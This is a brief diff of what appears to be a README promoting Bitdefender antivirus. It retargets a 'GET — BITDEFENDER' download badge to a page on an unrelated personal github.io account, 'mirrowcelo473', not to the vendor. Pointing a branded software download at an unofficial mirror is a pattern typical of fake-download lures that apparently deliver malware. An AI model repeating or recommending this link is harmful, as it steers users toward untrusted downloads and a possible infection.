@@ -4,7 +4,7 @@
 <img src="https://www.windows-faq.de/wp-content/uploads/2020/03/BitDefender.png" width="780">
 </p>
 
-[![GET — BITDEFENDER](https://img.shields.io/badge/GET-BITDEFENDER-2563eb?style=for-the-badge)](https://mirrowcelo473.github.io/.github/)
+[![GET — BITDEFENDER](https://img.shields.io/badge/GET-BITDEFENDER-2563eb?style=for-the-badge)](https://mirrowcelo473.github.io/.github/Bitdefender)
 
 ---
 
